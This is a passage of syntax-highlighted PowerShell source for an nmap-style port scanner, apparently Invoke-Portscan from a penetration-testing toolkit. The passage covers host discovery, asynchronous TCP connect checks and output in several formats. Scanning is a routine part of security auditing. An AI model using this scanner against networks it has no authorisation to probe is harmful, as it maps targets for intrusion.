<span class="hljs-variable">$Timeout</span> = <span class="hljs-number">1200</span> &#125;<br>                    <span class="hljs-number">3</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">20</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>;  <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2500</span> &#125;<br>                    <span class="hljs-number">2</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">15</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">3000</span> &#125;<br>                    <span class="hljs-number">1</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">10</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">5000</span> &#125;<br>                    default &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid T parameter&quot;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-variable">$grepStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$xmlStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$readableStream</span> = <span class="hljs-variable">$null</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$AllformatsOut</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$XmlOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$ReadableOut</span>) &#123;<br>                     <span class="hljs-built_in">Write-Warning</span> <span class="hljs-string">&quot;Both -oA specified with other output... going to ignore -oG/-oN/-oX&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$GrepOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.gnmap&quot;</span><br>                <span class="hljs-variable">$XmlOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.xml&quot;</span><br>                <span class="hljs-variable">$ReadableOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.nmap&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$GrepOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$AllformatsOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$grepStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$GrepOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ReadableOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$ReadableOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$ReadableOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$readableStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$ReadableOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XmlOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$XmlOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$XmlOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br><br>                <span class="hljs-variable">$xmlStream</span> =   [<span class="hljs-type">System.xml.xmlwriter</span>]::Create([<span class="hljs-built_in">string</span>]<span class="hljs-variable">$XmlOut</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartDocument()<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Portscanrun&quot;</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-variable">$version</span>)<br><br>            &#125;<br><br>            Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$DiscoveryPorts</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$hostPortList</span> | <span class="hljs-built_in">Out-Null</span><br><br>            <span class="hljs-variable">$startdate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$myInvocationLine</span> = <span class="hljs-variable">$PSCmdlet</span>.MyInvocation.Line<br>            <span class="hljs-variable">$startMsg</span> = <span class="hljs-string">&quot;Invoke-Portscan.ps1 v<span class="hljs-variable">$version</span> scan initiated <span class="hljs-variable">$startdate</span> as: <span class="hljs-variable">$myInvocationLine</span>&quot;</span><br><br>            <span class="hljs-comment">#TODO deal with output</span><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-comment"># #converting back from int array gives some argument error checking</span><br>            <span class="hljs-comment"># $sPortList = [string]::join(&quot;,&quot;, $portList)</span><br>            <span class="hljs-comment"># $sHostPortList = [string]::join(&quot;,&quot;, $hostPortList)</span><br><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-comment">#Port Scan Code - run on a per host basis</span><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-variable">$portScanCode</span> = &#123;<br>                <span class="hljs-keyword">param</span> (<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$thost</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$PortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$hostPortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$maxthreads</span>)<br>                <span class="hljs-keyword">Process</span><br>                &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$closedPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>                <span class="hljs-variable">$sockets</span> = <span class="hljs-selector-tag">@</span>&#123;&#125;<br>                <span class="hljs-variable">$timeouts</span> = <span class="hljs-built_in">New-Object</span> Hashtable<br><br>                <span class="hljs-comment">#set maximum $async threads</span><br>                <span class="hljs-variable">$fThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                <span class="hljs-variable">$aThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::GetMaxThreads([<span class="hljs-type">ref</span>]<span class="hljs-variable">$fThreads</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$aThreads</span>) | <span class="hljs-built_in">Out-Null</span><br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::SetMaxThreads(<span class="hljs-variable">$fthreads</span>,<span class="hljs-variable">$maxthreads</span>) | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">New-ScriptBlockCallback</span></span> &#123;<br>                    <span class="hljs-keyword">param</span>(<br>                        [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<br>                        [<span class="hljs-type">ValidateNotNullOrEmpty</span>()]<br>                        [<span class="hljs-type">scriptblock</span>]<span class="hljs-variable">$Callback</span><br>                    )<br><br>                    <span class="hljs-comment">#taken from http://www.nivot.org/blog/post/2009/10/09/PowerShell20AsynchronousCallbacksFromNET</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-string">&quot;CallbackEventBridge&quot;</span> <span class="hljs-operator">-as</span> [<span class="hljs-type">type</span>])) &#123;<br>                        <span class="hljs-built_in">Add-Type</span> <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                            using System;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            public sealed class CallbackEventBridge</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                public event AsyncCallback CallbackComplete = delegate &#123; &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private CallbackEventBridge() &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private void CallbackInternal(IAsyncResult result)</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    CallbackComplete(result);</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public AsyncCallback Callback</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    get &#123; return new AsyncCallback(CallbackInternal); &#125;</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public static CallbackEventBridge Create()</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    return new CallbackEventBridge();</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$bridge</span> = [<span class="hljs-type">CallbackEventBridge</span>]::Create()<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$bridge</span> <span class="hljs-literal">-EventName</span> CallbackComplete <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Callback</span> | <span class="hljs-built_in">Out-Null</span><br><br>                    <span class="hljs-variable">$bridge</span>.Callback<br><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Test-Port</span></span> &#123;<br><br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$p</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$timeout</span><br>                    )<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-variable">$pAddress</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$h</span>)<br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient <span class="hljs-variable">$pAddress</span>.AddressFamily<br><br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> &#123;<br>                        <span class="hljs-comment">#we&#x27;re assuming this is a host name</span><br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient<br>                    &#125;<br><br>                    <span class="hljs-variable">$scriptBlockAsString</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        #somewhat of a race condition with the timeout, but I don&#x27;t think it matters</span><br><span class="hljs-string">                        if ( `$sockets[<span class="hljs-variable">$p</span>] -ne `$NULL)</span><br><span class="hljs-string">                        &#123;</span><br><span class="hljs-string">                            if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                                `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$status = `$sockets[<span class="hljs-variable">$p</span>].Connected;</span><br><span class="hljs-string">                            if (`$status -eq `$True)</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is open&quot;</span><br><span class="hljs-string">                                `$openPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            else</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is closed&quot;</span><br><span class="hljs-string">                                `$closedPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            `$sockets[<span class="hljs-variable">$p</span>].Close();</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    <span class="hljs-variable">$timeoutCallback</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                        #write-host &quot;<span class="hljs-variable">$p</span> is filtered&quot;</span><br><span class="hljs-string">                        `$sockets[<span class="hljs-variable">$p</span>].Close()</span><br><span class="hljs-string">                        if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                            `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            `$filteredPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">                        `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">&quot;@</span><br><br>                    <span class="hljs-variable">$timeoutCallback</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$timeoutCallback</span>)<br><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">New-Object</span> System.Timers.Timer<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] <span class="hljs-literal">-EventName</span> Elapsed <span class="hljs-literal">-Action</span> <span class="hljs-variable">$timeoutCallback</span> | <span class="hljs-built_in">Out-Null</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Interval = <span class="hljs-variable">$timeout</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Enabled = <span class="hljs-variable">$true</span><br><br>                    <span class="hljs-variable">$myscriptblock</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$scriptBlockAsString</span>)<br>                    <span class="hljs-variable">$Null</span> = <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>].beginConnect(<span class="hljs-variable">$h</span>, <span class="hljs-variable">$p</span>,(<span class="hljs-built_in">New-ScriptBlockCallback</span>(<span class="hljs-variable">$myscriptblock</span>)) , <span class="hljs-variable">$null</span>)<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PortScan-Alive</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    <span class="hljs-keyword">Try</span><br>                    &#123;<br><br>                        <span class="hljs-comment">#ping</span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hostPortList</span>.Contains(<span class="hljs-literal">-1</span>))<br>                        &#123;<br>                            <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">new-object</span> System.Net.NetworkInformation.Ping<br>                            <span class="hljs-variable">$pResult</span> = <span class="hljs-variable">$ping</span>.send(<span class="hljs-variable">$h</span>)<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pResult</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>)<br>                            &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostPortList</span>)<br>                        &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Port</span> <span class="hljs-operator">-ne</span> <span class="hljs-literal">-1</span>)<br>                            &#123;<br>                                <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">do</span> &#123;<br>                            <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">100</span><br>                            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$openPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$closedPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)) &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">While</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)<br><br>                    &#125;<br>                    <span class="hljs-keyword">Catch</span><br>                    &#123;<br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to host scan <span class="hljs-variable">$h</span>&quot;</span><br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Portscan-Port</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    [<span class="hljs-built_in">string</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>()<br><br>                    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Portlist</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">Try</span><br>                        &#123;<br>                            <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                        &#125;<br>                        <span class="hljs-keyword">Catch</span><br>                        &#123;<br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to scan <span class="hljs-variable">$h</span> port <span class="hljs-variable">$Port</span>&quot;</span><br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = <span class="hljs-variable">$False</span><br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$SkipDiscovery</span>)<br>                &#123;<br>                    [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = PortScan<span class="hljs-literal">-Alive</span> <span class="hljs-variable">$thost</span><br>                    <span class="hljs-variable">$openPorts</span>.clear()<br>                    <span class="hljs-variable">$closedPorts</span>.clear()<br>                    <span class="hljs-variable">$filteredPorts</span>.Clear()<br>                &#125;<br>                <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$PingOnly</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$hostResult</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>))<br>                &#123;<br>                    Portscan<span class="hljs-literal">-Port</span> <span class="hljs-variable">$thost</span><br>                &#125;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">500</span><br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$hostResult</span>, <span class="hljs-variable">$openPorts</span>, <span class="hljs-variable">$closedPorts</span>, <span class="hljs-variable">$filteredPorts</span>)<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment"># the outer loop is to flush the loop.</span><br>            <span class="hljs-comment"># Otherwise Get-Job | Wait-Job could clog, etc</span><br><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$saveIteration</span> = <span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$computersDone</span>=<span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$upHosts</span>=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$saveIteration</span> * <span class="hljs-variable">$SyncFreq</span>) <span class="hljs-operator">-lt</span> <span class="hljs-variable">$hostList</span>.Count)<br>            &#123;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Remove-Job</span> <span class="hljs-literal">-Force</span><br>                <span class="hljs-variable">$sIndex</span> = (<span class="hljs-variable">$saveIteration</span>*<span class="hljs-variable">$SyncFreq</span>)<br>                <span class="hljs-variable">$eIndex</span> = ((<span class="hljs-variable">$saveIteration</span>+<span class="hljs-number">1</span>)*<span class="hljs-variable">$SyncFreq</span>)<span class="hljs-literal">-1</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostList</span>[<span class="hljs-variable">$sIndex</span><span class="hljs-type">..</span><span class="hljs-variable">$eIndex</span>])<br>                &#123;<br>                    <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$ctr</span>.Count <span class="hljs-operator">-ge</span> <span class="hljs-variable">$nHosts</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milliseconds</span> <span class="hljs-variable">$SleepTimer</span><br>                        <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    &#125;<br><br>                    <span class="hljs-variable">$computersDone</span>++<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$noProgressMeter</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Write-Progress</span> <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;Port Scanning&quot;</span> <span class="hljs-literal">-Activity</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-CurrentOperation</span> <span class="hljs-string">&quot;starting computer <span class="hljs-variable">$computersDone</span>&quot;</span>  <span class="hljs-literal">-PercentComplete</span> (<span class="hljs-variable">$computersDone</span> / <span class="hljs-variable">$hostList</span>.Count * <span class="hljs-number">100</span>)<br>                    &#125;<br><br>                    <span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> <span class="hljs-variable">$portScanCode</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$iHost</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$iHost</span>, <span class="hljs-variable">$SkipDiscovery</span>, <span class="hljs-variable">$PingOnly</span>, <span class="hljs-variable">$Timeout</span>, <span class="hljs-variable">$portList</span>, <span class="hljs-variable">$hostPortList</span>, <span class="hljs-variable">$Threads</span>)  | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Wait-Job</span> | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$job</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-Job</span>)<br>                &#123;<br>                    <span class="hljs-variable">$jobOut</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Receive-Job</span> <span class="hljs-variable">$job</span>)<br>                    [<span class="hljs-built_in">bool</span>]<span class="hljs-variable">$hostUp</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">0</span>]<br>                    <span class="hljs-variable">$jobName</span> = <span class="hljs-variable">$job</span>.Name<br><br>                    <span class="hljs-variable">$openPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">1</span>]<br>                    <span class="hljs-variable">$closedPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">2</span>]<br>                    <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-variable">$jobOut</span><span class="hljs-function">[<span class="hljs-number">3</span>]</span><br><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hostUp</span>) &#123;<br>                        <span class="hljs-variable">$upHosts</span> ++<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$quiet</span>)<br>                    &#123;<br>                        <span class="hljs-variable">$hostDate</span> = <span class="hljs-built_in">Get-Date</span><br>                        <span class="hljs-variable">$hostObj</span> = <span class="hljs-built_in">New-Object</span> System.Object<br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> Hostname <span class="hljs-literal">-Value</span> <span class="hljs-variable">$jobName</span><br><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> alive <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostUp</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> openPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$openPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> closedPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$closedPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> filteredPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$filteredPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> NoteProperty <span class="hljs-literal">-Name</span> finishTime <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostDate</span><br><br>                        <span class="hljs-variable">$scannedHostList</span> += <span class="hljs-variable">$hostobj</span><br>                    &#125;<br><br>                    <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-outhost</span> <span class="hljs-variable">$jobName</span> <span class="hljs-literal">-isUp</span> <span class="hljs-variable">$hostUp</span> <span class="hljs-literal">-openPorts</span> <span class="hljs-variable">$openPorts</span> <span class="hljs-literal">-closedPorts</span> <span class="hljs-variable">$closedPorts</span> <span class="hljs-literal">-filteredPorts</span> <span class="hljs-variable">$filteredPorts</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span> <span class="hljs-literal">-SkipDiscovery</span> <span class="hljs-variable">$SkipDiscovery</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                    <span class="hljs-variable">$grepStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span 